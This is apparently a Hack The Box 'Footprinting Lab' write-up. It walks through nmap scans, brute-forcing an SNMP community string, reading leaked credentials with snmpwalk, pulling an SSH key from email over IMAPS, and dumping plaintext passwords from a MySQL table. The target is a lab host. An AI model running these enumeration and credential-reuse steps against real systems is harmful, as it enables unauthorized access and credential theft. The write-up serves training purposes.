**Platfrom:** Hack The Box(HTB)

**Lab Name:** Footprinting Lab

**Difficulty:** Hard

**Date Completed:** 2026-05-10

**Attacker OS:** Kali Linux

**Target OS:** Ubuntu Linux

**Target IP:** 10.129.202.20

**Goal:** Find the HTB password

---

***Tools Used :***
- nmap
- onesixtyone
- snmpwalk
- curl
- ssh
- mysql

---

***Port Scanning :***

&nbsp;&nbsp;&nbsp;&nbsp;I started by splitting the TCP scans into two separate runs. The reason is simple — running them together is slow. First, Scan all the ports and say which prots are open.
<br>

```bash
nmap -p- --min-rate 5000 -T4 10.129.202.20
```

<img width="312" height="241" alt="h-1" src="https://github.com/user-attachments/assets/96844d2a-e656-408d-a604-5b6bec68cd96" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp;Get more detail about the open ports.
<br><br>


```bash
nmap -sV -sC -p 22,110,143,993,995 10.129.202.20
```

<img width="340" height="656" alt="h-2" src="https://github.com/user-attachments/assets/c0f3777f-6138-4a1f-8b33-14c187ab3bcb" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp;I could see POP3, POP3s, IMAP and IMAPS are the open ports. These are all ports used for reading email, that there was a mail server running on the machine. Seeing that, I decided to run a UDP scan as well, because some services only run on UDP.
<br><br>

> It is always good practice to check both TCP and UDP

```bash
nmap -p- -sU --min-rate 5000 -T4 10.129.202.20
```

<img width="302" height="227" alt="h-3" src="https://github.com/user-attachments/assets/bfc221c4-31e3-4d13-979a-b33a3d6b2848" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp; That UDP scan revealed SNMP. Let's get more detail
<br><br>

```bash
nmap -sV -sC -sU -p 161 10.129.202.20
```

<img width="343" height="250" alt="h-4" src="https://github.com/user-attachments/assets/58464a8d-cf03-4863-8796-b81de91ff6c3" />

---

***SNMP Enumeration :***

&nbsp;&nbsp;&nbsp;&nbsp;SNMP (Simple Network Management Protocol) is used to monitor and manage network devices. It uses community strings like passwords(v2c). Even though nmap repoted SNMPv3 that does not mean SNMPv2c is disable. lets check by the tool onesixtyone to see if community strings respond. If they do, you know v2c is still active.
<br>

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
```

<img width="760" height="62" alt="h-5" src="https://github.com/user-attachments/assets/61e9a4ed-fcc9-4cc1-a4e2-da90f132c4f8" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp;Onesixtyone found a valid community string (backup), that means the server was also accepting SNMPv2c. Let's enumerat with snmpwalk.
<br><br>

```bash
snmpwalk -v2c -c backup 10.129.202.20
```

<img width="689" height="550" alt="h-6" src="https://github.com/user-attachments/assets/ac629d30-1a58-4551-9bbc-0fd7c141d596" />
<img width="680" height="303" alt="h-7" src="https://github.com/user-attachments/assets/1da15a5c-3f97-4f1b-b53e-2051036626ea" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp;By the SNMP Enumertion with snmpwalk, we got Credential = tom:NMds732Js2761.By this credential, we can enumerat into IMAP port.

---
***IMAP Enumeration :***

&nbsp;&nbsp;&nbsp;&nbsp;With the credentials for tom, we can now access the mail server directly over IMAPS.
<br>

```bash
curl -k imaps://10.129.202.20 --user tom:NMds732Js2761
```

<img width="400" height="83" alt="h-8" src="https://github.com/user-attachments/assets/d0d6ed9b-50fd-4836-b7a2-c79aa20d5d7e" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp;We found five mailboxes. Let's check for email in INBOX
<br><br>

```bash
curl -k imaps://10.129.202.20/INBOX?ALL --user tom:NMds732Js2761
```

<img width="464" height="47" alt="h-9-1" src="https://github.com/user-attachments/assets/1302aa92-aefa-41a5-be38-31c484aa8743" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp; One email was exists in INBOX. let's read the email
<br><br>

```bash
curl -k "imaps://10.129.202.20/INBOX;MAILINDEX=1" --user tom:NMds732Js2761
```

<img width="484" height="404" alt="h-9" src="https://github.com/user-attachments/assets/01343a8d-aa8b-4ae2-9efa-3cf150f6ee06" />

<br>
This is huge. We have a private SSH key. we need to copy it exactly, save it to a file, set the correct permissions with chmod 600, and then use it to SSH in as tom.
<br><br>

---
***Access SSH :***

&nbsp;&nbsp;&nbsp;&nbsp; Save the private key
<br>

```bash
nano id_rsa    
vim id_rsa     
chmod 600 id_rsa
```

<img width="168" height="103" alt="h-10" src="https://github.com/user-attachments/assets/d8ec2653-9c1d-4e67-8192-f90384f37a67" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp; Let's login into ssh as a username tom.
<br><br>

```bash
ssh tom@10.129.202.20 -i id_rsa
```

<img width="469" height="151" alt="h-11" src="https://github.com/user-attachments/assets/7aa520f3-4b7d-413a-95ee-d270256b38d1" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp; We successfully logined in. Now I need to figure out what I can access and where the flag might be. First I check what is in tom's home directory, then I look at who else is on this machine
<br><br>

<img width="485" height="567" alt="h-12" src="https://github.com/user-attachments/assets/ddbb1a9e-551a-4fb9-a006-835462512eb2" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp; I ran ls -al in the home directory to see everything including hidden files. Seeing a MySQL history file told me straight away that tom had been using a local database. I confromed by .bash_history and .mysql_history.
<br><br>

```bash
cat ~/.mysql_history
cat ~/.bash_history
```

<img width="302" height="621" alt="h-13" src="https://github.com/user-attachments/assets/71baa98c-0572-475c-aff9-3da445c9a998" />
<br>
<img width="112" height="48" alt="h-14" src="https://github.com/user-attachments/assets/f445f304-7a62-43c1-a8ad-bc077577a942" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp; From .mysql_history revealed repeated queries against a users database and tom has a previously logged into MySQL. let's login into MySQL as a tom
<br><br>

```bash
mysql -u tom -p
```

<img width="479" height="162" alt="h-15" src="https://github.com/user-attachments/assets/67eeaf29-bf9c-4b82-aeaa-c3fa58b54d37" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp; Successfully logged into MySQL. Now, let get table which as username and password.
<br><br>

```bash
SHOW databases;
USE users;
SHOW tables;
DESCRIBE users;
SELECT * FROM users;
```

<img width="412" height="625" alt="h-16" src="https://github.com/user-attachments/assets/dca5b81e-b1d4-4243-99df-47271bb25738" />

<br>
&nbsp;&nbsp;&nbsp;&nbsp; The table contained multiple usernames and passwords. The target HTB password was found here.
<br><br>

<h3 align = center> Goal Achieved </h3>

---
***Summary :***

<br>
&nbsp;&nbsp;&nbsp;&nbsp; A TCP scan revealed a mail server, and a follow-up UDP scan uncovered a misconfigured SNMP service. Brute-forcing the community string exposed tom's credentials sitting in a process table. Those credentials unlocked the mail server where a private SSH key was found inside an email. SSH access led to bash and MySQL history files revealing a local database. The same password reused on MySQL exposed a users table with the target password stored in plaintext.
<br><br>
